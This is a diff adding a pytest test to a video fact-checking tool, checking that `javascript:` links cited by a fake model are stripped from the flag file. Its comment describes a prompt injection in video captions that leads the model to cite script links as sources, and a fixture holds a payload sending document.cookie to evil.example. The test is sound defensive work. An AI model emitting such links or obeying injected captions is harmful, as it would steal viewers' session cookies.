@@ -768,3 +768,37 @@ def test_figures_checked_without_google_key(tmp_path, monkeypatch):
     assert [f["quote"] for f in data["flags"] if f["type"] == "inaccuracy"] == [FALSE]
     assert "verdicts" in {r["kind"] for r in jsonl(claude_log)}
     assert [c["outcome"] for c in jsonl(home / "claims.jsonl")] == ["flagged"]
+
+
+# Inline 2026-11-22 · A source link is a web address, never a script
+#
+# Story: The captions of a video carry a prompt injection, and the model cites a `javascript:` link: once as the dated
+# source of a false figure, once as the earlier statement that contradicts the guest. A click on such a link in the
+# player would run the script. Neither link reaches the flag file: the figure has no source left, so no flag; the
+# record has no web link, so no contradiction flag.
+#
+# Setup: invented word-by-word captions with the two claims of S9 A1; a fake Fact Check Tools API that finds nothing;
+# a fake Claude that cites `javascript:` links with valid dates; a temporary helper home.
+
+SCRIPT = "javascript:fetch('https://evil.example/'+document.cookie)"
+
+
+class ScriptLinkModel:
+    def complete(self, prompt, schema, tools=()):
+        if "verdicts" in schema["properties"]:
+            return {"verdicts": [
+                own_words(PACT, {"quote": EARLIER, "date": "2023-07-02", "publisher": "El Diario", "url": SCRIPT},
+                          [{"publisher": "El Diario", "url": SCRIPT, "date": "2023-07-02"}]),
+                own_words(TAXES, None, [{"publisher": "INE", "url": SCRIPT, "date": "2025-10-28"}]),
+            ]}
+        return {"flags": [], "questions": [], "contradictions": [],
+                "claims": [{"quote": q, "speaker": "Invitado", "queries": [q], "question": None, "kind": "own_words"}
+                           for q in (PACT, TAXES)]}
+
+
+def test_script_links_dropped(tmp_path):
+    run_analysis("scripts", 0, transcript=FakeTranscript(spoken([(0, PACT), (10, TAXES)])), llm=ScriptLinkModel(),
+                 factcheck=NoPublishedChecks(), home=tmp_path)
+    data = (tmp_path / "videos" / "scripts.json").read_text()
+    assert "javascript:" not in data, "FAIL · a javascript: link reached the flag file"
+    assert json.loads(data)["flags"] == [], "FAIL · a flag with no web source was made"
